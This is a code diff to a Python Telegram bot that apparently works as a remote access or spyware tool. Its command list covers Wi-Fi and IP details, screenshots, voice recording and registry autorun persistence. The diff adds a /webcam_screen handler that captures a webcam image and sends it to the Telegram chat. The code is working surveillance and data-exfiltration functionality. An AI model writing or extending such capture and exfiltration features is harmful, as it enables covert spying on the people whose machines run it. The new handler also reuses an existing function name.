@@ -27,6 +27,7 @@ async def support(message: types.Message):
                          f'/wifi_info - Information about Wi-Fi connections\n'
                          f'/pub_ip_info - Information about public IP address\n'
                          f'/screen - Desktop screenshot\n'
+                         f'/webcam_screen - Webcam screen\n'
                          f'/audio n - (n - count of seconds)Record sound from voice recorder for 5 seconds by default\n'
                          f'/reg_autorun - Append programme to registry\n'
                          f'/del_autorun - Delete programme from registry\n'
@@ -93,6 +94,13 @@ async def send_screen(message: types.Message):
     screen_path = module.View().make_screenshot()
     await message.answer_photo(open(screen_path, "rb"))
     os.remove(screen_path)
+
+
+@dp.message_handler(commands="webcam_screen")
+async def send_screen(message: types.Message):
+    webcam_screen_path = module.View().make_webcam_screen()
+    await message.answer_photo(open(webcam_screen_path, "rb"))
+    os.remove(webcam_screen_path)
 
 
 @dp.message_handler(commands="audio")
